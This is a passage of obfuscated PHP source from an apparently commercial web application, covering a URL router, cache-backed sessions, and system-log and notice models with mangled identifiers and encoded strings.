error($ığûçŞæ) { self::$errorCallback = $ığûçŞæ; } public static function haltOnMatch($¨Ôô¦®À = true) { self::$halts = $¨Ôô¦®À; } public static function dispatch() { $–æçÌàˆ =& $_SERVER[ˆûùúÊ¯]; $Şìø–ê = parse_url($_SERVER[$–æçÌàˆ[1648]], PHP_URL_PATH); $İÙ¤ ÙÊ = $_SERVER[$–æçÌàˆ[169]]; $•Š»ß­ğ = array_keys(static::$patterns); $¡Ú²ä˜Ö = array_values(static::$patterns); $²Ñè ß = !1; self::$routes = preg_replace($–æçÌàˆ[1337], $–æçÌàˆ[8], self::$routes); if (in_array($Şìø–ê, self::$routes)) { $îå¶œ‹Ş = array_keys(self::$routes, $Şìø–ê); foreach ($îå¶œ‹Ş as $Ÿòäœç) { if (self::$methods[$Ÿòäœç] == $İÙ¤ ÙÊ || self::$methods[$Ÿòäœç] == $–æçÌàˆ[1649] || in_array($İÙ¤ ÙÊ, self::$maps[$Ÿòäœç])) { $²Ñè ß = !0; if (!is_object(self::$callbacks[$Ÿòäœç])) { $ˆ¥ìÛÑŞ = explode($–æçÌàˆ[8], self::$callbacks[$Ÿòäœç]); $“ì“­·› = end($ˆ¥ìÛÑŞ); $÷Ë×‹ÅÏ = explode($–æçÌàˆ[1269], $“ì“­·›); $Ö©™ãÅÑ = new $÷Ë×‹ÅÏ[0](); $Ö©™ãÅÑ->{$÷Ë×‹ÅÏ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ÿòäœç]); if (self::$halts) { return; } } } } } else { $çÇ°ßŠ‘ = 0; foreach (self::$routes as $Ÿòäœç) { if (strpos($Ÿòäœç, $–æçÌàˆ[4]) !== !1) { $Ÿòäœç = str_replace($•Š»ß­ğ, $¡Ú²ä˜Ö, $Ÿòäœç); } if (preg_match($–æçÌàˆ[1650] . $Ÿòäœç . $–æçÌàˆ[1651], $Şìø–ê, $Œ¸‡ıâ)) { if (self::$methods[$çÇ°ßŠ‘] == $İÙ¤ ÙÊ || self::$methods[$çÇ°ßŠ‘] == $–æçÌàˆ[1649] || !empty(self::$maps[$çÇ°ßŠ‘]) && in_array($İÙ¤ ÙÊ, self::$maps[$çÇ°ßŠ‘])) { $²Ñè ß = !0; array_shift($Œ¸‡ıâ); if (!is_object(self::$callbacks[$çÇ°ßŠ‘])) { $ˆ¥ìÛÑŞ = explode($–æçÌàˆ[8], self::$callbacks[$çÇ°ßŠ‘]); $“ì“­·› = end($ˆ¥ìÛÑŞ); $÷Ë×‹ÅÏ = explode($–æçÌàˆ[1269], $“ì“­·›); $Ö©™ãÅÑ = new $÷Ë×‹ÅÏ[0](); if (!method_exists($Ö©™ãÅÑ, $÷Ë×‹ÅÏ[1])) { echo $–æçÌàˆ[1652]; } else { call_user_func_array(array($Ö©™ãÅÑ, $÷Ë×‹ÅÏ[1]), $Œ¸‡ıâ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$çÇ°ßŠ‘], $Œ¸‡ıâ); if (self::$halts) { return; } } } } $çÇ°ßŠ‘++; } } if ($²Ñè ß == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¸í„£ğ =& $_SERVER[ˆûùúÊ¯]; header($_SERVER[$¸í„£ğ[1653]] . $¸í„£ğ[1654]); echo $¸í„£ğ[1655]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$–æçÌàˆ[1648]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $„ïÖè· =& $_SERVER[ˆûùúÊ¯]; static $Ó›ßÉâ = false; if ($Ó›ßÉâ) { return $Ó›ßÉâ; } $Êğ¼õá = $GLOBALS[$„ïÖè·[6]][$„ïÖè·[401]]; self::$sessionTime = $Êğ¼õá[$„ïÖè·[1656]]; $Ïè•İ³° = isset($GLOBALS[$„ïÖè·[1657]]) ? $GLOBALS[$„ïÖè·[1657]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ïè•İ³°)) { self::$sessionSign = Cookie::get($Ïè•İ³°); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Ïè•İ³°, self::$sessionSign, self::$sessionTime); $¸ˆ‘†óî = $Êğ¼õá[$„ïÖè·[1658]]; $Ş«Äù•° = $Êğ¼õá[$¸ˆ‘†óî]; $Ó“ÛØä¿ = $Êğ¼õá[$„ïÖè·[888]]; switch ($¸ˆ‘†óî) { case $„ïÖè·[31]: self::$handle = Model($„ïÖè·[889]); break; case $„ïÖè·[890]: self::$handle = new CacheRedis($Ş«Äù•°, $Ó“ÛØä¿); break; case $„ïÖè·[891]: self::$handle = new CacheMemcached($Ş«Äù•°, $Ó“ÛØä¿); break; case $„ïÖè·[223]: $Ş«Äù•°[$„ïÖè·[94]] = $Ş«Äù•°[$„ïÖè·[94]] . $„ïÖè·[1659]; self::$handle = new CacheFile($Ş«Äù•°, $Ó“ÛØä¿); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ó›ßÉâ = new self(); return $Ó›ßÉâ; } public static function getBySign($’¥ÆŸÆä) { $·©æ›÷œ = self::$handle->get($’¥ÆŸÆä); $·©æ›÷œ = unserialize($·©æ›÷œ); return is_array($·©æ›÷œ) ? $·©æ›÷œ : array(); } public static function setBySign($’¿’Îã–, $œ…ÉüÚ) { CacheLock::lock($’¿’Îã–); self::$handle->set($’¿’Îã–, serialize($œ…ÉüÚ), self::$sessionTime); CacheLock::unlock($’¿’Îã–); } public static function sign($¾ù©Œ¯ = false) { if ($¾ù©Œ¯) { self::$sessionSign = $¾ù©Œ¯; } self::init(); return self::$sessionSign; } public static function set($ßúÜÁêÕ, $í¿‡â„‘ = false) { self::init(); if (is_array($ßúÜÁêÕ)) { foreach ($ßúÜÁêÕ as $­¨Ë§¥Å => $ÍÈ¿¶è) { array_set_value(self::$data, $­¨Ë§¥Å, $ÍÈ¿¶è); } } else { array_set_value(self::$data, $ßúÜÁêÕ, $í¿‡â„‘); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ªÑóåÈğ = false) { self::init(); if (!$ªÑóåÈğ) { return self::$data; } return array_get_value(self::$data, $ªÑóåÈğ); } public static function remove($ò‡ßª¡î) { self::init(); unset(self::$data[$ò‡ßª¡î]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ˆûùúÊ¯][894])) { self::$handle->clearTimeout(); } } } goto cÎËîğ¢ÑÅ; f¦Êã¤¬¬: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\151\155\145", "\x74\x69\155\145", "\151\x6e\x73\x65\x72\164", "\x66\165\156\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $îŞùˆ‚û =& $_SERVER[ˆûùúÊ¯]; return array($îŞùˆ‚û[2232] => LNG($îŞùˆ‚û[2233]), $îŞùˆ‚û[2234] => LNG($îŞùˆ‚û[2235]), $îŞùˆ‚û[1839] => LNG($îŞùˆ‚û[2236]), $îŞùˆ‚û[2237] => LNG($îŞùˆ‚û[2238]), $îŞùˆ‚û[2239] => LNG($îŞùˆ‚û[2240]), $îŞùˆ‚û[2241] => LNG($îŞùˆ‚û[2242]), $îŞùˆ‚û[2243] => LNG($îŞùˆ‚û[2244]), $îŞùˆ‚û[1869] => LNG($îŞùˆ‚û[2244]), $îŞùˆ‚û[1870] => LNG($îŞùˆ‚û[2245]), $îŞùˆ‚û[2246] => LNG($îŞùˆ‚û[2247]), $îŞùˆ‚û[2248] => LNG($îŞùˆ‚û[2249]), $îŞùˆ‚û[2250] => LNG($îŞùˆ‚û[2251]), $îŞùˆ‚û[2252] => LNG($îŞùˆ‚û[2253]), $îŞùˆ‚û[1867] => LNG($îŞùˆ‚û[2254]), $îŞùˆ‚û[2255] => LNG($îŞùˆ‚û[2256]), $îŞùˆ‚û[1874] => LNG($îŞùˆ‚û[2257]), $îŞùˆ‚û[2258] => LNG($îŞùˆ‚û[2259]), $îŞùˆ‚û[2260] => LNG($îŞùˆ‚û[2261]), $îŞùˆ‚û[2262] => LNG($îŞùˆ‚û[2263]), $îŞùˆ‚û[2264] => LNG($îŞùˆ‚û[2265]), $îŞùˆ‚û[1877] => LNG($îŞùˆ‚û[2266]), $îŞùˆ‚û[1878] => LNG($îŞùˆ‚û[2267]), $îŞùˆ‚û[2268] => LNG($îŞùˆ‚û[2269]), $îŞùˆ‚û[2270] => LNG($îŞùˆ‚û[2271]), $îŞùˆ‚û[2272] => LNG($îŞùˆ‚û[2273]), $îŞùˆ‚û[1872] => LNG($îŞùˆ‚û[2274]), $îŞùˆ‚û[2275] => LNG($îŞùˆ‚û[2276]), $îŞùˆ‚û[1871] => LNG($îŞùˆ‚û[2277]), $îŞùˆ‚û[2278] => LNG($îŞùˆ‚û[2279]), $îŞùˆ‚û[2280] => LNG($îŞùˆ‚û[2281]), $îŞùˆ‚û[2282] => LNG($îŞùˆ‚û[2283]), $îŞùˆ‚û[2284] => LNG($îŞùˆ‚û[2284]), $îŞùˆ‚û[2285] => LNG($îŞùˆ‚û[1843]), $îŞùˆ‚û[2286] => LNG($îŞùˆ‚û[2287]), $îŞùˆ‚û[2288] => LNG($îŞùˆ‚û[2289]), $îŞùˆ‚û[2290] => LNG($îŞùˆ‚û[2291]), $îŞùˆ‚û[2292] => LNG($îŞùˆ‚û[2293]), $îŞùˆ‚û[2294] => LNG($îŞùˆ‚û[2295]), $îŞùˆ‚û[2296] => LNG($îŞùˆ‚û[2296]), $îŞùˆ‚û[2297] => LNG($îŞùˆ‚û[2298]), $îŞùˆ‚û[2299] => LNG($îŞùˆ‚û[2300]), $îŞùˆ‚û[2301] => LNG($îŞùˆ‚û[2302]), $îŞùˆ‚û[2303] => LNG($îŞùˆ‚û[2304]), $îŞùˆ‚û[2305] => LNG($îŞùˆ‚û[2306]), $îŞùˆ‚û[2307] => LNG($îŞùˆ‚û[2308])); } private function typeFile() { $İú£ÙŞï =& $_SERVER[ˆûùúÊ¯]; $Òõå²†ö = array($İú£ÙŞï[1874] => array($İú£ÙŞï[1875]), $İú£ÙŞï[2250] => array($İú£ÙŞï[2309]), $İú£ÙŞï[2252] => array($İú£ÙŞï[2310]), $İú£ÙŞï[1867] => array($İú£ÙŞï[1868], $İú£ÙŞï[2311]), $İú£ÙŞï[2260] => array(), $İú£ÙŞï[2262] => array(), $İú£ÙŞï[2264] => array(), $İú£ÙŞï[1877] => array($İú£ÙŞï[1879]), $İú£ÙŞï[1878] => array($İú£ÙŞï[1879]), $İú£ÙŞï[2268] => array($İú£ÙŞï[2312]), $İú£ÙŞï[2270] => array($İú£ÙŞï[2312]), $İú£ÙŞï[2272] => array($İú£ÙŞï[2313]), $İú£ÙŞï[2258] => array($İú£ÙŞï[2314]), $İú£ÙŞï[1872] => array($İú£ÙŞï[2315]), $İú£ÙŞï[2275] => array($İú£ÙŞï[2316]), $İú£ÙŞï[1871] => array($İú£ÙŞï[1873])); return $Òõå²†ö; } private function typeAll() { $·Õ´ß¤” =& $_SERVER[ˆûùúÊ¯]; $™ÇÅÌ = $this->typeList; $îØšàÈ» = array_filter($this->typeFile()); foreach ($îØšàÈ» as $í—™©ù => $Í­‚’—í) { $™ÇÅÌ[$Í­‚’—í[0]] = $™ÇÅÌ[$í—™©ù]; } $™ÇÅÌ[$·Õ´ß¤”[1879]] = LNG($·Õ´ß¤”[2317]); $™ÇÅÌ[$·Õ´ß¤”[2312]] = LNG($·Õ´ß¤”[2318]); return $™ÇÅÌ; } public function addLog($¥ê€¯«±, $µäí„¼ = array()) { $ŒÆØ–¼¿ =& $_SERVER[ˆûùúÊ¯]; if (!isset($this->typeList[$¥ê€¯«±])) { return; } $Èû¸ÄÃÈ = isset($µäí„¼[$ŒÆØ–¼¿[1704]]) ? $µäí„¼[$ŒÆØ–¼¿[1704]] : 0; if (!$Èû¸ÄÃÈ) { $Èû¸ÄÃÈ = Session::get($ŒÆØ–¼¿[2033]); } if ($¥ê€¯«± == $ŒÆØ–¼¿[2286] && is_array($µäí„¼[$ŒÆØ–¼¿[2319]]) && !$µäí„¼[$ŒÆØ–¼¿[2319]]) { return; } $ßòÛî› = get_client_ip(); if (!$µäí„¼ || strlen(json_encode($µäí„¼)) >= 1024) { $µäí„¼ = array($ŒÆØ–¼¿[2320] => $ßòÛî›); } else { if (is_array($µäí„¼)) { $µäí„¼[$ŒÆØ–¼¿[2320]] = $ßòÛî›; } else { $µäí„¼ = array($ŒÆØ–¼¿[1263] => $µäí„¼, $ŒÆØ–¼¿[2320] => $ßòÛî›); } } $µäí„¼ = array($ŒÆØ–¼¿[1694] => Session::sign(), $ŒÆØ–¼¿[1695] => intval($Èû¸ÄÃÈ), $ŒÆØ–¼¿[43] => $¥ê€¯«±, $ŒÆØ–¼¿[1697] => json_encode($µäí„¼)); parent::add($µäí„¼); } public function remove($ÑŸØª¾ı) { $this->where(array($_SERVER[ˆûùúÊ¯][469] => $ÑŸØª¾ı))->delete(); } private function _makeOrder($š¹éşÀş = '') { $Àãâœæâ =& $_SERVER[ˆûùúÊ¯]; $ü¨ÆÆèİ = $Àãâœæâ[224]; $Ù±‡¤øó = array($Àãâœæâ[499] => $Àãâœæâ[500], $Àãâœæâ[501] => $Àãâœæâ[502]); $ƒ”È™”Ö = Input::get($Àãâœæâ[507], $Àãâœæâ[7], $Àãâœæâ[2069], array($Àãâœæâ[1987], $Àãâœæâ[501])); $ƒ”È™”Ö = $Ù±‡¤øó[$ƒ”È™”Ö]; $š¹éşÀş = $š¹éşÀş . "{$ü¨ÆÆèİ}\40{$ƒ”È™”Ö}"; return $this->order($š¹éşÀş); } public function get($Ôãˆ¯½ = '') { $‹Û˜ûí­ =& $_SERVER[ˆûùúÊ¯]; if (!$Ôãˆ¯½) { show_json(array()); } $“»‘ÒÃ£ = array(); if ($Ôãˆ¯½[$‹Û˜ûí­[1704]]) { $“»‘ÒÃ£[$‹Û˜ûí­[1704]] = $Ôãˆ¯½[$‹Û˜ûí­[1704]]; } if (isset($Ôãˆ¯½[$‹Û˜ûí­[820]])) { $¬‚ë‘ÄÉ = $Ôãˆ¯½[$‹Û˜ûí­[820]]; $—Öû¬Ãı = isset($Ôãˆ¯½[$‹Û˜ûí­[821]]) ? $Ôãˆ¯½[$‹Û˜ûí­[821]] : time(); $“»‘ÒÃ£[$‹Û˜ûí­[224]] = array($‹Û˜ûí­[385], array($¬‚ë‘ÄÉ, $—Öû¬Ãı)); } if ($Ôãˆ¯½[$‹Û˜ûí­[43]]) { $£ÄÅƒÈ¹ = explode($‹Û˜ûí­[60], $Ôãˆ¯½[$‹Û˜ûí­[43]]); $ì¹¾„Ä = $this->typeFile(); $¾ê…ŠØ¬ = array(); foreach ($£ÄÅƒÈ¹ as $ğÂÃªº¢) { $¾ê…ŠØ¬[] = $ğÂÃªº¢; if (isset($ì¹¾„Ä[$ğÂÃªº¢])) { $¾ê…ŠØ¬ = array_merge($¾ê…ŠØ¬, $ì¹¾„Ä[$ğÂÃªº¢]); } } $¾ê…ŠØ¬ = array_unique($¾ê…ŠØ¬); if ($¾ê…ŠØ¬) { $“»‘ÒÃ£[$‹Û˜ûí­[43]] = array($‹Û˜ûí­[7], $¾ê…ŠØ¬); } } else { $“»‘ÒÃ£[$‹Û˜ûí­[43]] = array($‹Û˜ûí­[2321], $‹Û˜ûí­[2322]); } if (!empty($Ôãˆ¯½[$‹Û˜ûí­[2320]])) { $“»‘ÒÃ£[$‹Û˜ûí­[502]] = array($‹Û˜ûí­[435], "\45{$Ôãˆ¯½[$‹Û˜ûí­[2320]]}\45"); } $ñÙÏ‡ÀÁ = $this->_makeOrder()->where($“»‘ÒÃ£)->selectPage(); if (empty($ñÙÏ‡ÀÁ[$‹Û˜ûí­[421]])) { show_json(array(), !0, $ñÙÏ‡ÀÁ[$‹Û˜ûí­[418]]); } $ñÙÏ‡ÀÁ[$‹Û˜ûí­[421]] = $this->logList($ñÙÏ‡ÀÁ[$‹Û˜ûí­[421]]); return $ñÙÏ‡ÀÁ; } private function ipAddress(&$ÓğÑ›€¼) { $ œé¿‰Ë =& $_SERVER[ˆûùúÊ¯]; if (!empty($ÓğÑ›€¼[$ œé¿‰Ë[2320]])) { $Û¾Â£Ù = IpLocation::get($ÓğÑ›€¼[$ œé¿‰Ë[2320]]); } else { $Û¾Â£Ù = LNG($ œé¿‰Ë[2323]); } $ÓğÑ›€¼[$ œé¿‰Ë[2324]] = $Û¾Â£Ù; } private function descZipDownload($¾á‰ÓÂ, &$à‰‹Îû) { $´’×‘ =& $_SERVER[ˆûùúÊ¯]; if (!isset($¾á‰ÓÂ[$´’×‘[2325]])) { return; } $ÁàÀƒø = json_decode($¾á‰ÓÂ[$´’×‘[2325]], !0); foreach ($ÁàÀƒø as $µ×Ô—“’) { try { $„ÆŒìä¼ = IO::infoFullSimple($µ×Ô—“’[$´’×‘[94]]); } catch (Exception $è„’ƒÇ) { continue; } $¾á‰ÓÂ[$´’×‘[94]] = $µ×Ô—“’[$´’×‘[94]]; $à‰‹Îû[] = $¾á‰ÓÂ[$´’×‘[190]] = $„ÆŒìä¼[$´’×‘[190]]; $à‰‹Îû[] = $¾á‰ÓÂ[$´’×‘[2124]] = $„ÆŒìä¼[$´’×‘[189]]; break; } return $¾á‰ÓÂ; } private function getSourceList(&$µËÈÓ­Ô) { $òÒâ¾Ø =& $_SERVER[ˆûùúÊ¯]; $·İ‹ã­ = array(); foreach ($µËÈÓ­Ô as $ª²Úàëš => $ŸÉÀË®š) { $¹¡ĞÂ÷ = json_decode($ŸÉÀË®š[$òÒâ¾Ø[502]], !0); if ($ŸÉÀË®š[$òÒâ¾Ø[43]] == $òÒâ¾Ø[1870]) { $¹¡ĞÂ÷ = $this->descZipDownload($¹¡ĞÂ÷, $·İ‹ã­); $µËÈÓ­Ô[$ª²Úàëš][$òÒâ¾Ø[502]] = json_encode($¹¡ĞÂ÷); continue; } if (strpos($ŸÉÀË®š[$òÒâ¾Ø[43]], $òÒâ¾Ø[2126]) !== 0) { if (!isset($¹¡ĞÂ÷[$òÒâ¾Ø[94]]) || strpos($ŸÉÀË®š[$òÒâ¾Ø[43]], $òÒâ¾Ø[2326]) !== 0) { continue; } try { $Ë†¿Á¦ = IO::infoFullSimple($¹¡ĞÂ÷[$òÒâ¾Ø[94]]); } catch (Exception $ï×…™«‘) { continue; } $·İ‹ã­[] = $¹¡ĞÂ÷[$òÒâ¾Ø[190]] = $Ë†¿Á¦[$òÒâ¾Ø[190]]; $·İ‹ã­[] = $¹¡ĞÂ÷[$òÒâ¾Ø[2124]] = $Ë†¿Á¦[$òÒâ¾Ø[189]]; $µËÈÓ­Ô[$ª²Úàëš][$òÒâ¾Ø[502]] = json_encode($¹¡ĞÂ÷); continue; } $·İ‹ã­[] = $¹¡ĞÂ÷[$òÒâ¾Ø[190]]; $·İ‹ã­[] = $¹¡ĞÂ÷[$òÒâ¾Ø[2124]]; if ($¹¡ĞÂ÷[$òÒâ¾Ø[43]] == $òÒâ¾Ø[596]) { $·İ‹ã­[] = $¹¡ĞÂ÷[$òÒâ¾Ø[502]][$òÒâ¾Ø[1221]]; $·İ‹ã­[] = $¹¡ĞÂ÷[$òÒâ¾Ø[502]][$òÒâ¾Ø[1222]]; } if ($¹¡ĞÂ÷[$òÒâ¾Ø[43]] == $òÒâ¾Ø[2134]) { $·İ‹ã­[] = $¹¡ĞÂ÷[$òÒâ¾Ø[502]][$òÒâ¾Ø[190]]; } } if (!$·İ‹ã­) { return array(); } return Model($òÒâ¾Ø[885])->sourceListInfo($·İ‹ã­, !0); } private function logList($ÉçÜ©É) { $°ÍîÉ‚™ =& $_SERVER[ˆûùúÊ¯]; $¹ÈµĞœ = array_to_keyvalue($ÉçÜ©É, $°ÍîÉ‚™[12], $°ÍîÉ‚™[1704]); $ÅµôÀ¿¤ = Model($°ÍîÉ‚™[575])->userListInfo(array_unique($¹ÈµĞœ)); $½²ƒÍû¨ = $this->getSourceList($ÉçÜ©É); $¥ºÖÚˆƒ = $this->typeAll(); $ğÄõº„Ù = array(); $åÃ„Ä€ = array(); foreach ($ÉçÜ©É as $¡³ùèà¡ => $Äù“áºì) { $§ïıû¿“ = $Äù“áºì[$°ÍîÉ‚™[43]]; $Ïõ˜ã¿Á = isset($ÅµôÀ¿¤[$Äù“áºì[$°ÍîÉ‚™[1704]]]) ? $ÅµôÀ¿¤[$Äù“áºì[$°ÍîÉ‚™[1704]]] : !1; $€®ÔÙØú = strpos($§ïıû¿“, $°ÍîÉ‚™[2327]) === 0 ? LNG($°ÍîÉ‚™[2328]) : LNG($°ÍîÉ‚™[2323]); $Äù“áºì[$°ÍîÉ‚™[42]] = isset($Ïõ˜ã¿Á[$°ÍîÉ‚™[42]]) ? $Ïõ˜ã¿Á[$°ÍîÉ‚™[42]] : LNG($°ÍîÉ‚™[2323]); $Äù“áºì[$°ÍîÉ‚™[2178]] = isset($Ïõ˜ã¿Á[$°ÍîÉ‚™[2178]]) ? $Ïõ˜ã¿Á[$°ÍîÉ‚™[2178]] : $°ÍîÉ‚™[12]; $Äù“áºì[$°ÍîÉ‚™[1601]] = isset($¥ºÖÚˆƒ[$§ïıû¿“]) ? $¥ºÖÚˆƒ[$§ïıû¿“] : $€®ÔÙØú; $Äù“áºì[$°ÍîÉ‚™[2068]] = $Ïõ˜ã¿Á; $Ÿ©×‡½ = json_decode($Äù“áºì[$°ÍîÉ‚™[502]], !0); $Äù“áºì[$°ÍîÉ‚™[2320]] = isset($Ÿ©×‡½[$°ÍîÉ‚™[2320]]) ? $Ÿ©×‡½[$°ÍîÉ‚™[2320]] : $°ÍîÉ‚™[12]; $Äù“áºì[$°ÍîÉ‚™[2324]] = IpLocation::get($Äù“áºì[$°ÍîÉ‚™[2320]]); if (strpos($§ïıû¿“, $°ÍîÉ‚™[2126]) === 0 || isset($Ÿ©×‡½[$°ÍîÉ‚™[2124]])) { $Ÿ©×‡½[$°ÍîÉ‚™[97]] = $½²ƒÍû¨[$Ÿ©×‡½[$°ÍîÉ‚™[190]]]; $Ÿ©×‡½[$°ÍîÉ‚™[2139]] = $½²ƒÍû¨[$Ÿ©×‡½[$°ÍîÉ‚™[2124]]]; if ($Ÿ©×‡½[$°ÍîÉ‚™[43]] == $°ÍîÉ‚™[596]) { $Ÿ©×‡½[$°ÍîÉ‚™[502]][$°ÍîÉ‚™[1221]] = $½²ƒÍû¨[$Ÿ©×‡½[$°ÍîÉ‚™[502]][$°ÍîÉ‚™[1221]]]; $Ÿ©×‡½[$°ÍîÉ‚™[502]][$°ÍîÉ‚™[1222]] = $½²ƒÍû¨[$Ÿ©×‡½[$°ÍîÉ‚™[502]][$°ÍîÉ‚™[1222]]]; } if ($Ÿ©×‡½[$°ÍîÉ‚™[43]] == $°ÍîÉ‚™[2134]) { $Ÿ©×‡½[$°ÍîÉ‚™[502]][$°ÍîÉ‚™[190]] = $½²ƒÍû¨[$Ÿ©×‡½[$°ÍîÉ‚™[502]][$°ÍîÉ‚™[190]]]; } if ($Ÿ©×‡½[$°ÍîÉ‚™[43]] == $°ÍîÉ‚™[1865]) { $Ÿ©×‡½[$°ÍîÉ‚™[2139]] = $Ÿ©×‡½[$°ÍîÉ‚™[97]]; $Ÿ©×‡½[$°ÍîÉ‚™[2124]] = $Ÿ©×‡½[$°ÍîÉ‚™[2139]][$°ÍîÉ‚™[190]]; $Ÿ©×‡½[$°ÍîÉ‚™[97]] = !1; $Ÿ©×‡½[$°ÍîÉ‚™[190]] = $°ÍîÉ‚™[12]; } if ($Ÿ©×‡½[$°ÍîÉ‚™[97]] && $Ÿ©×‡½[$°ÍîÉ‚™[97]][$°ÍîÉ‚™[187]] == $°ÍîÉ‚™[188]) { $åÃ„Ä€[] = $Äù“áºì[$°ÍîÉ‚™[451]]; unset($ÉçÜ©É[$¡³ùèà¡]); continue; } if ($Ÿ©×‡½[$°ÍîÉ‚™[2139]] && $Ÿ©×‡½[$°ÍîÉ‚™[2139]][$°ÍîÉ‚™[187]] == $°ÍîÉ‚™[188]) { $åÃ„Ä€[] = $Äù“áºì[$°ÍîÉ‚™[451]]; unset($ÉçÜ©É[$¡³ùèà¡]); continue; } } $Äù“áºì[$°ÍîÉ‚™[502]] = $Ÿ©×‡½; unset($Äù“áºì[$°ÍîÉ‚™[2329]]); $ğÄõº„Ù[] = $Äù“áºì; } $this->clearSystemPathLog($åÃ„Ä€); return $ğÄõº„Ù; } private function clearSystemPathLog($­‹öÀ´) { $ş¤ıÔ¾“ =& $_SERVER[ˆûùúÊ¯]; if (count($­‹öÀ´) == 0) { return; } $‡Îè¯Üğ = array($ş¤ıÔ¾“[451] => array($ş¤ıÔ¾“[7], array_unique($­‹öÀ´))); $this->where($‡Îè¯Üğ)->delete(); } public function deviceList($Ûóë¡Ü, $ü§œö¹³ = 0) { $Ê€õÄ»Ï =& $_SERVER[ˆûùúÊ¯]; $ì–½Óó = array($Ê€õÄ»Ï[1704] => $Ûóë¡Ü, $Ê€õÄ»Ï[224] => array($Ê€õÄ»Ï[1075], $ü§œö¹³), $Ê€õÄ»Ï[43] => $Ê€õÄ»Ï[1839]); $ªÅÉÊ‹— = array(); $ìÛ˜ÈÅÇ = $this->field($Ê€õÄ»Ï[2330])->where($ì–½Óó)->order($Ê€õÄ»Ï[2137])->limit(50)->select(); foreach ($ìÛ˜ÈÅÇ as $ƒú²†Ëõ => $“Œ‰½³) { if ($ƒú²†Ëõ > 0 && abs($“Œ‰½³[$Ê€õÄ»Ï[224]] - $ìÛ˜ÈÅÇ[$ƒú²†Ëõ - 1][$Ê€õÄ»Ï[224]]) < 5) { continue; } $ºíÄİ©ä = json_decode($“Œ‰½³[$Ê€õÄ»Ï[502]], !0); $“Œ‰½³[$Ê€õÄ»Ï[2320]] = isset($ºíÄİ©ä[$Ê€õÄ»Ï[2320]]) ? $ºíÄİ©ä[$Ê€õÄ»Ï[2320]] : $Ê€õÄ»Ï[12]; unset($ºíÄİ©ä[$Ê€õÄ»Ï[2320]]); $¹´İ±€ = $this->deviceType($ºíÄİ©ä[$Ê€õÄ»Ï[2127]]); if (isset($ªÅÉÊ‹—[$¹´İ±€])) { continue; } $“Œ‰½³[$Ê€õÄ»Ï[2324]] = IpLocation::get($“Œ‰½³[$Ê€õÄ»Ï[2320]]); $“Œ‰½³[$Ê€õÄ»Ï[502]] = $ºíÄİ©ä; $ªÅÉÊ‹—[$¹´İ±€] = $“Œ‰½³; } return array_values($ªÅÉÊ‹—); } public function deviceType($ÉÆÇ‹×²) { return $ÉÆÇ‹×²; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x6e\x6f\164\x69\143\145\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\143\x6f\x6e\164\145\x6e\x74", "\x61\165\164\x68", "\155\157\x64\x65", "\x74\151\x6d\x65", "\164\x79\160\145", "\154\145\x76\145\154", "\x65\x6e\141\142\154\145", "\163\157\162\x74"); public function listData($æŞŠŞÖï = false, $íÆÄåÂ• = "\x73\x6f\162\164", $ŒÏ°À‰ø = false) { return parent::listData($æŞŠŞÖï, $íÆÄåÂ•, $ŒÏ°À‰ø); } public function add($€«½¿¼Ú) { $ ¼ªƒòâ =& $_SERVER[ˆûùúÊ¯]; $„‘ÒŒÔ¸ = time(); if ($€«½¿¼Ú[$ ¼ªƒòâ[26]] == $ ¼ªƒòâ[2331]) { $„‘ÒŒÔ¸ = strtotime($€«½¿¼Ú[$ ¼ªƒòâ[203]]); } $€«½¿¼Ú[$ ¼ªƒòâ[203]] = $„‘ÒŒÔ¸; return parent::insert($€«½¿¼Ú); } public function update($¥úÚÔá, $¢ò«ôá) { $ŞÇºŠğ =& $_SERVER[ˆûùúÊ¯]; $ë¿‘áÎŸ = $this->listData($¥úÚÔá); if (!$ë¿‘áÎŸ) { return !1; } $¶º©€Ÿ = time(); if ($¢ò«ôá[$ŞÇºŠğ[26]] == $ŞÇºŠğ[2331]) { $¶º©€Ÿ = strtotime($¢ò«ôá[$ŞÇºŠğ[203]]); } $¢ò«ôá[$ŞÇºŠğ[203]] = $¶º©€Ÿ; return parent::update($¥úÚÔá, $¢ò«ôá); } public function remove($Ú¿÷Ïíç) { $ğáûƒÊ = $this->listData($Ú¿÷Ïíç); if (!$ğáûƒÊ || $ğáûƒÊ[$_SERVER[ˆûùúÊ¯][188]]) { return !1; } return parent::remove($Ú¿÷Ïíç); } public function sort($ÓÅšò¡ã, $ˆ•û¨ë) { return parent::update($ÓÅšò¡ã, $ˆ•û¨ë); } public function enable($ı½²ï›, $’Ú©îğ) { return parent::update($ı½²ï›, array($_SERVER[ˆûùúÊ¯][2332] => $’Ú©îğ)); } private function initUserOption() { $ß¬ñ‹Ş© =& $_SERVER[ˆûùúÊ¯]; $this->optionType = $ß¬ñ‹Ş©[2333]; $this->modelType = $ß¬ñ‹Ş©[2334]; $this->field = array($ß¬ñ‹Ş©[2335], $ß¬ñ‹Ş©[42], $ß¬ñ‹Ş©[203], $ß¬ñ‹Ş©[43], $ß¬ñ‹Ş©[2336], $ß¬ñ‹Ş©[810], $ß¬ñ‹Ş©[219]); } public function userNoticeGet($š™•ŠŸ = false) { $this->initUserOption(); return parent::listData($š™•ŠŸ, $_SERVER[ˆûùúÊ¯][451], !0); } public function userNoticeAdd($Æàê¹ä) { 